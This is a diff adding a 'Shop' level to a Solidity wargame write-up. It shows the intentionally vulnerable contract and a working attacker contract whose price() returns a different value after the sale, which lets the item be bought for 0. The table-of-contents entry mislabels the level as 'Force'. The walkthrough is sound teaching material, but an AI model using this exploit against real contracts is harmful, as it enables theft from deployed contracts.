@@ -24,6 +24,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 19. [Level 18: MagicNumber](#level-18-magic-number)
 20. [Level 19: Alien Codex](#level-19-alien-codex)
 21. [Level 20: Denial](#level-20-denial)
+22. [Level 21: Force](#level-21-force)
 
 
 ## Level 0: Intro <a name="level-0-intro"></a>
@@ -1749,3 +1750,77 @@ and you are done :)
 The `call` function is a powerful tool, but it can also be dangerous. Always
 make sure to check the return value of the function call and limit the gas
 forwarded to the function.
+
+## Level 21: Shop <a name="level-21-shop"></a>
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+```
+
+Our objective is to buy the object at a lower price than the current price.
+
+The contract has a `price` variable, which is set to 100. The contract has a `buy`
+function, which checks whether the price of the buyer is greater or equal to the
+price of the object and whether the object has already been sold. If both conditions
+are met, the object is sold and the price of the object is set to the price of the
+buyer.
+
+The contract uses an interface `Buyer`, which has a `price` function. The buyer
+contract has to implement the `price` function. Important to note: it has the
+`view` modifier, which means that the function does not change the state of the
+contract.
+
+Let's do it :)
+
+Here is our contract:
+
+```solidity
+pragma solidity ^0.8.0;
+
+interface IShop {
+    function buy() external;
+    function isSold() external view returns (bool);
+}
+
+contract Buyer {
+
+    function buyFromShop(address _shop) public {
+        IShop(_shop).buy();
+    }
+
+    function price() external view returns (uint256) {
+        return IShop(msg.sender).isSold() ? 0 : 100;
+    }
+}
+```
+
+Deploy the `Buyer` contract and call the `buyFromShop()` function with the
+Shop instance address. Your contract does the rest :)
+
+### Learning
+
+For the love of christ - do not trust any contract. The shop calls the
+`price` function of the buyer contract twice and trusts the return value.
+There is nothing which prevents the `Buyer` contract to change its data
+between calls.
